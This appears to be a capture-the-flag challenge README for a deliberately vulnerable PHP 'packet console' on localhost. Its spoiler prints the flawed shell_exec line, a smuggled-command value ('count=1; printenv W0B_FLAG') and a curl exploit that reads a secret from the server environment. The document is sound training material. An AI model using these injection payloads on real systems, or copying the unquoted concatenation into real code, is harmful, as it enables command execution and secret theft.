# w06 :: Command Deck

- **Category:** Web
- **Difficulty:** medium
- **Stack:** PHP 8.3 / Apache
- **URL:** http://localhost:30006

## Brief

COMMAND DECK is the internal packet console. Point it at a host, press
**PING** or **TRACEROUTE**, and the deck shells out from its own machine and
prints the raw tool output.

The console is trusted tooling: the tool name is whitelisted and the host
argument is shell-quoted before it reaches the command line. The packet count
is a number, so it is pasted in as typed.

The deck's own environment is where the deck keeps its one secret. There is no
flag file anywhere in the document root.

## Goal

Get the deck to run a command you chose, and make that command read the secret
out of the deck's process environment.

## Hint

Read the "deck notes" again with a hostile eye. One of the three claims is
load-bearing and the other two are the padding you would add to make the
weakness look defended.

The count lands directly inside a shell command string — no quoting, no
numeric check. A single `;` (or `` ` ``) turns "ping a host N times" into
"ping a host, then run something else".

What you run is up to you. The flag is not on disk; it is in the process
environment of the web server, and PHP exposes exactly one way for a shell
child to hand environment variables to you: have the shell expand them.

<details>
<summary>Spoiler</summary>

The vulnerable line in `app/index.php`:

```php
$cmd = $tool . ' ' . $opt . ' ' . ($_POST['count'] ?? $_GET['count'] ?? '1') . ' ' . escapeshellarg($host);
$out = shell_exec($cmd . ' 2>&1');
```

`$tool` is whitelisted, `$host` is wrapped in `escapeshellarg`, but `count` is
concatenated raw, so it is a second injection point sitting in plain sight.

```
POST /
tool=ping&host=127.0.0.1&count=1; printenv W0B_FLAG
```

builds `ping -c 1; printenv W0B_FLAG '127.0.0.1' 2>&1` — ping runs, then
`printenv` runs, and its output is echoed in the deck output block.

Or in one line:

```bash
curl -s http://localhost:30006/ \
  --data-urlencode 'tool=ping' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'count=1; printenv W0B_FLAG' | grep hex4b0t
```

`solution/exploit.sh` wraps this; `solution/probe.sh` also asserts the normal
(non-injected) run works and leaks nothing.

</details>
